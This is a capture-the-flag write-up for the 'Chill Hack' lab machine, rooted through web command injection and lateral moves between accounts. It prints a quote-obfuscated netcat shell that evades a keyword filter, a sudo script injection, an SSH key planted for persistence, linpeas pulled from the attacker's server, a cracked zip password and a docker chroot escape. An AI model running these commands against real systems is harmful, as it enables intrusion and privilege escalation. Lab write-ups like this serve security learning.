# Chill Hack
### 

Target machine IP: 10.80.129.48<br>
Attack machine IP: 192.168.136.34

Like always, contents of snippets is cut down for brevity. Shown content is not modified.

### Port scan
Start with mapping out open ports:
```
└─# nmap -sS 10.80.129.48 -p- -vv -n
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```
Like in many CTFs, common ports (80, 22, 21) are open.

Check what software and which versions are there
```
└─# nmap -sC -sV -O 10.80.129.48 -p21,22,80 -vv -n
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Game Info
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
```
>I used -vv and -n option to have more output in the terminal (verbose) and not to resolve dns names (it doesn't have one)
### Anonymous FTP
There is a file `note.txt` on anonymous FTP! Connect to ftp:
```
└─# ftp 10.80.129.48 21
Connected to 10.80.129.48.
220 (vsFTPd 3.0.5)
Name (10.80.129.48:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.

ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> 
```
Retrieving the note now!
```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||65000|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |**********************************************************************************|    90        0.80 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.59 KiB/s)
ftp> exit
221 Goodbye.
```
Nice! It's always satysfying to see the progress bar and the simple, yet beautiful timers and connection speed output

What's inside that note?
```
└─$ cat note.txt    
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
Oh, so there's filtering, somewhere? Might be useful for later then.

We have no other clues at this point. FTP is straightforward and we don't have much more to gather from there. 
### Subpages
Let's see if there are any subpages on http server. Naturally, we use gobuster.
```
└─$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url 10.80.129.48 -x php,html,txt
...
secret               (Status: 301) [Size: 313] [--> http://10.80.129.48/secret/]
```
>Secret, huh? I wonder what's so 'secret' about it
### The secret subpage
We can execute commands here!

I tried executing `ls` but it returns 'Alert Are you a hacker?'. So it's blocked.<br>`whoami` works, however.
```
command: whoami
response: www-data
```
Next I went for `sudo -l`. An interesting response was returned:
```
command: sudo -l
response: Matching Defaults entries for www-data on ip-10-80-129-48: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ip-10-80-129-48: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
So there's a user named `apaar` and we can execute his `.helpline.sh` (a potential privilege escalation vector)
>Note both things: the script name starts with a dot, so it's hidden while using simple 'ls' command. You need to specify '-a' parameter for 'all'.
>Second thing being that 'sudo -l' tells us we can execute the script with user 'apaar', not root. So we'll be potentially able to escalate to apaar account.  

Since `cat`, `ls` and `less` commands are blocked ("Are you a hacker" page is returned) I went for the unconventional way: let's use grep!
```
command: grep
response: 
index.php: background-image: url('images/FailingMiserableEwe-size_restricted.gif');
index.php: background-image: url('images/blue_boy_typing_nothought.gif'); 
```
Okay, so that are the gifs that play in the background. Now we know for sure that we're dealing with a .php file.
>PS: Directory/Path Traversal doesn't work :'(

Half an hour later... 

Commands for reverse shell do not work: `nc`, `python`, `php`, etc..<br>
So I thought of ways to enumerate system users:
```
command: getent group
response (partial):
aurick:x:1000:
apaar:x:1001:
anurodh:x:1002
```
That's alright, but we don't go any further. 
### Obfuscating the payload
**Obfuscation is the key.**

I did some testing, and found out that commands are blocked based on keywords. If there's a `python`, `nc` or even `ls` keyword, it'll fail. <br>
There are several ways to break the filtering. Most obvious ones are using `'` signs and a backslash `\` sign.

This way we can execute any command we want!
```
command: l's'
response: images index.php

command: l\s
response: images index.php
```
>Filtering evasion is quite the rabbithole, and I'd love to dive into it soon!

I've opened up my trustworthy reverse shell vault and obfuscated one of them:
```
command: mk'fif'o /tmp/f; 'n'c -lv'n'p 5217 < /t'm'p/f | /'b'in/'s'h >/t'm'p/f 2>&1; 'r'm /t'm'p/f
```
Response: It hanged! Meaning it's listening for incoming connections.
```
└─$ nc -nv 10.80.129.48 5217
(UNKNOWN) [10.80.129.48] 5217 (?) open
whoami
www-data
```
We have a very simple, unstable session here. We need to upgrade it. 
Python is available, now it's a walk in a park.<br>
```
python3 --version
Python 3.8.10
python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@ip-10-80-129-48:/var/www/html/secret$ 
```
>I've used -c parameter to execute python commands directly from the command line

### A 'privileged' script
So what now? We still don't have access to user flag located in other user's home!
```
www-data@ip-10-80-129-48:/home/apaar$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-80-129-48:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-80-129-48:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
Ooooh.. So we can run a shell script with sudo rights?<br>That's what we saw from exploring secret page!

What's inside?
```
www-data@ip-10-80-129-48:/home/apaar$ cat /home/apaar/.helpline.sh
cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```
A command execution vulnerability. How wonderful!
>Quick explanation: $msg variable provided by user can be anything. Even shell commands. 
```
www-data@ip-10-80-129-48:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
<html/secret$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
test
Hello user! I am test,  Please enter your message: /bin/bash
/bin/bash
whoami
whoami
apaar
```
>Sorry for doubled command output. One is the command I wrote, the second is actually the command sent to bash.
### The first flag and creating ssh session
The user flag is found in /home/apaar/local.txt
`{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`
```
apaar@ip-10-80-129-48:~$ cat /home/apaar/local.txt
cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```
It's not needed, but logging into apaar ssh session would allow us to fully utilize bash functionality (with Ctrl+C commands not breaking the entire connection)

We need to somehow login into apaar ssh. Let's generate an ssh key on our host machine
```
└─# ssh-keygen -f apaar
Generating public/private ed25519 key pair.
Enter passphrase for "apaar" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in apaar
Your public key has been saved in apaar.pub
The key fingerprint is:
SHA256:0TAXF5pv43c3HgXVlzUBVtcra5e/qC/udH//RzDG6oY root@kali
The key's randomart image is:
+--[ED25519 256]--+
|        o o.o+o+X|
|         = +.  o*|
|        . +  .. o|
|         . . .=o |
|        S   +oooo|
|           o.+ oo|
|           +o.o++|
|          E.+.+.B|
|          o=+o +O|
+----[SHA256]-----+
```
>I used '123' as passphrase. Kids, don't do it at home!

On target machine I've added public key (apaar.pub) to authorized_keys in /home/apaar/.ssh folder
```
apaar@ip-10-80-129-48:~/.ssh$ echo "ssh-ed25519 yourkeyhere root@kali" > authorized_keys
```
Again, on our attack machine let's try to connect through ssh using apaar key
>You need to be in the directory where apaar and apaar.key are present
```
└─# ssh -i apaar apaar@10.80.129.48
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'apaar':
Last login: Sat Jan 24 12:34:13 2026 from 192.168.136.34
apaar@ip-10-80-129-48:~$ 
```
Worked nicely. We can now check for privilege escalation vectors with linpeas. 
### Exploring privilege escalation vectors with linpeas
Download the script on your attack machine and host it with python3 http server
```
└─# wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
└─# python3 -m http.server 5217
Serving HTTP on 0.0.0.0 port 5217 (http://0.0.0.0:5217/) ...
```
On target machine use wget to retrieve the script. I recommend using /tmp folder for download (only for CTFs!)
```
apaar@ip-10-80-129-48:/tmp$ wget http://192.168.136.34:5217/linpeas.sh
--2026-01-24 12:40:22--  http://192.168.136.34:5217/linpeas.sh
Connecting to 192.168.136.34:5217... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1007100 (983K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                      100%[======================================================>] 983.50K  2.90MB/s    in 0.3s    

2026-01-24 12:40:22 (2.90 MB/s) - ‘linpeas.sh’ saved [1007100/1007100]
```
>Before executing the script, you need to use 'chmod o+x' on the file. It'll grant execution privileges for the owner (apaar)

After a short investigation, we can notice that there are two ports nmap didn't show us:
```
3306 mysql
9001 http
```
### Uncovering hidden files
Let's see what's in /var/www/files directory. It contains files related to the website.

There is one .jpg image file in ./images directory. I'm gonna use steghide to check if something's hiding inside it.

Use python3 http server, this time on target machine to transfer the file to your attack machine.
```
apaar@ip-10-80-129-48:/var/www/files/images$ python3 -m http.server 5217
```
```
└─# wget http://10.80.129.48:5217/hacker-with-laptop_23-2147985341.jpg
```
>We did this, because 'steghide' is available only on our own machine
```
└─# steghide --extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
```
No passphrase needed! Just click 'Enter' and it saves `backup.zip`.
```
┌──(root㉿kali)-[/home/kali/ctf_chill]
└─# unzip backup.zip                       
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password
```
..Because of course it's encrypted!
### Let's crack it!
John, our beloved password cracker has entered the chat! (Yes, Hashcat will be covered.. eventually, in a different CTF ;)
```
└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.crackme                    
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2026-01-26 08:20) 50.00g/s 614400p/s 614400c/s 614400C/s total90..hawkeye
Use the "--show" opt
```
In less than a second the password was found.

Unzip the file and enter the password
```
└─# unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php
```
If we `cat` it into the terminal, we can quickly find out there's a login page for user Anurodh, and his password is `IWQwbnRLbjB3bVlwQHNzdzByZA==` (in base64).

Decoding it quickly with base64, it translates to: `!d0ntKn0wmYp@ssw0rd`
### Enter the account
Maybe it's the key to his account?
```
└─# ssh anurodh@10.80.129.48
anurodh@10.80.129.48's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
...
anurodh@ip-10-80-129-48:~$ 
```
And the next account is breached!

### Escalate privileges to root
```
anurodh@ip-10-80-129-48:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```
Ahh, so it's a docker container! Does GTFOBins tells us anything about it?

The answer is yes! The last final command is to use:
```
anurodh@ip-10-80-129-48:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
# 
```
Now, who are we?
```
# whoami
root
```
>Rest in peace, Chill Hack CTF.

Final flag is in /root/proof.txt file: 
`{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`

### Thank you for reading!
Thanks for following yet another writeup! It's the third one this week, and I'm so excited to make more!

In the coming days I will rewrite my legacy writeups from Medium here. I think I wrote one or two of them some time ago.

>Pssst! Upcoming writeups will have images! (I did not know you can store them on your github..)

### Sources
[https://www.kali.org/tools/nmap/](https://www.kali.org/tools/nmap/)<br>
[https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)<br>
[https://docs.python.org/3/library/http.server.html](https://docs.python.org/3/library/http.server.html)<br>
[https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)<br>
[https://www.kali.org/tools/steghide/](https://www.kali.org/tools/steghide/)<br>
[https://www.kali.org/tools/john/](https://www.kali.org/tools/john/)<br>
[https://gtfobins.org/gtfobins/docker/](https://gtfobins.org/gtfobins/docker/)
